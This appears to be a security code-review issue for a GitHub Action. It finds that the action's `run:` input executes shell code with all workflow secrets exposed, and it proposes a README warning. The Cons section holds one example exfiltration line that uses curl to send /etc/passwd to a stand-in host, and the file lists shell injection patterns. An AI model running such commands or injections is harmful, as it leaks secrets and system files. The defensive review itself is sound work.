---
status: pending
priority: p3
issue_id: "018"
tags: [code-review, security, documentation]
dependencies: []
---

# Document `run:` Input Security Risks

## Problem Statement

The `run:` input executes arbitrary shell code via `bash -c <command>`. The subprocess receives the full `process.env` including `GITHUB_TOKEN`, all workflow secrets, and all runner environment variables. There is no documentation warning users not to populate `run:` from untrusted GitHub event data (PR titles, issue bodies, dispatch payloads).

## Findings

- `src/container/exec.ts:18` — `exec.exec('bash', ['-c', command], ...)` — full shell execution
- `src/container/exec.ts:20` — `...(process.env as Record<string, string>)` — all secrets passed in
- No warning in README or action.yml about injection risk
- Common misuse: `run: ${{ github.event.pull_request.title }}` would execute the PR title as shell code

## Proposed Solutions

### Option 1: Add security warning to README and action.yml

Add a `> [!WARNING]` callout box in the README explaining:
1. `run:` is executed as a shell command via `bash -c`
2. The subprocess receives all workflow secrets and environment variables
3. `run:` must never be set to an untrusted value from GitHub event context
4. Always use a static command like `npm test`, not `${{ github.event... }}`

**Effort:** 30 minutes

**Risk:** None (documentation)

---

### Option 2: Add a check to reject obvious injection patterns

**Approach:** Add a runtime check that rejects `run:` values containing common shell injection patterns (`$(`, `` ` ``, `&&`, `||`).

**Pros:**
- Provides some runtime protection

**Cons:**
- Trivially bypassable (still passes `; curl exfil.io/$(cat /etc/passwd)`)
- May reject legitimate multi-command patterns users need

**Effort:** 1 hour

**Risk:** Medium (false positives)

## Recommended Action

Option 1 — documentation warning is the right control here. Option 2 creates a false sense of security.

## Technical Details

**Affected files:**
- `README.md` (add security callout)
- `action.yml` (add description warning for `run` input)

## Acceptance Criteria

- [ ] README has explicit warning about shell injection risk for `run:` input
- [ ] README explains that subprocess receives all workflow secrets
- [ ] action.yml `run` input description mentions security constraints

## Work Log

### 2026-03-18 - Discovery

**By:** Security review agent
